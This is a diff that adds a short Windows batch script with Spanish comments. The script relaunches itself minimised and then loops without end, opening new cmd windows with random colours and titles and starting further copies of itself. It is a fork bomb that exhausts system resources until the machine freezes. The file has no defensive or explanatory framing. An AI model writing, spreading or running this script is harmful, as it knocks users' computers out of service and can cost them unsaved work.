@@ -1,0 +1,14 @@
+@echo off
+setlocal EnableDelayedExpansion
+
+:: Auto-replicación silenciosa
+if "%~1"=="" (
+    start /min "" "%~f0" x
+    exit
+)
+
+:: Bomba de fork con ventanas visibles (más agresiva visualmente)
+:loop
+start cmd /c "color 0a & title %random% & echo %random%%random%%random% & pause >nul"
+start "" "%~f0" x
+goto loop
